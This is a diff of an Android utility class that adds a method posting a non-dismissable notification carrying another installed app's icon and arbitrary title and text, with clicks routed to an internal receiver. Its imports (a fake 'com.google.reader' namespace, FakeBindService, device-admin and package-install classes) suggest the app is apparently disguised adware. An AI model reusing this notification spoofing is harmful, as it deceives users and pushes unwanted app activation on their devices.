@@ -1,9 +1,6 @@
 package com.xstd.ip;
 
-import android.app.Activity;
-import android.app.Notification;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
+import android.app.*;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
@@ -13,6 +10,8 @@ import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -23,9 +22,12 @@ import android.os.IBinder;
 import android.os.storage.StorageManager;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
+import android.widget.RemoteViews;
 import com.andorid.shu.love.LoveReaderActivity;
 import com.google.reader.R;
+import com.xstd.ip.module.ActiveApplicationInfo;
 import com.xstd.ip.module.ApplicationInfo;
+import com.xstd.ip.receiver.ActiveReceiver;
 import com.xstd.ip.receiver.BindDeviceReceiver;
 import com.xstd.ip.service.CoreService;
 import com.xstd.ip.service.FakeBindService;
@@ -355,5 +357,35 @@ public class Tools {
         if (str.trim().length() == 0)
             return true;
         return false;
+    }
+
+    public static void activeApplicationByNotification(Service context, ActiveApplicationInfo info) {
+        Intent intent = context.getPackageManager().getLaunchIntentForPackage(info.getPackageName());
+        if (intent == null)
+            return;
+        Drawable icon = null;
+        try {
+            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(info.getPackageName(), PackageManager.GET_ACTIVITIES);
+            if (packageInfo != null)
+                icon = packageInfo.applicationInfo.loadIcon(context.getPackageManager());
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+        if (info.getDisplayTime() <= 0) {
+            info.setDisplayTime(System.currentTimeMillis());
+        }
+
+        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+        Notification notification = new Notification(R.drawable.ic_jog_dial_sound_on, info.getTickerText(), System.currentTimeMillis());
+        notification.flags = Notification.FLAG_NO_CLEAR;
+        RemoteViews contentView = new RemoteViews(context.getPackageName(), R.layout.notification);
+        contentView.setImageViewBitmap(R.id.image, ((BitmapDrawable) icon).getBitmap());
+        contentView.setTextViewText(R.id.title, info.getTitle());
+        contentView.setTextViewText(R.id.text, info.getContent());
+        Intent receiver = new Intent(context, ActiveReceiver.class);
+        receiver.putExtra("info", info);
+        contentView.setOnClickPendingIntent(R.id.parent, PendingIntent.getBroadcast(context, 0, receiver, 0));
+        notification.contentView = contentView;
+        nm.notify(123, notification);
     }
 }
